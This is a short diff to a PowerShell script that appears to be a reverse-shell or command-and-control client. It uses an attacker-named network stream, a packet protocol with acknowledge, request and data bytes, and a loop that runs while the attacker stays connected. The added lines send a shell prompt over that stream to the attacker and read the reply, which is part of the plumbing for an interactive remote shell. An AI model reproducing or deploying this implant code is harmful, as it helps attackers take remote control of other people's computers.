@@ -90,6 +90,12 @@ $AcknowledgeByte                        = 0x1
 $RequestByte                            = 0x2
 $HasData                                = 0x3
 
+$Prompt                                 = "$(prompt)" # or prompt
+$EncodedOutput                          = [Byte] @(@($HasData) + @($Encoding.GetBytes($Prompt)))
+$Packet                                 = [Byte] (Application-ify $EncodedOutput)
+$BytesWritten                           = $AttackerStream.Write($Packet, 0, $Packet.Length)
+$BytesRead                              = $AttackerStream.Read($Buffer, 0, $Buffer.Length)
+
 while ($Attacker.Connected)
 {
     Sleep-Random
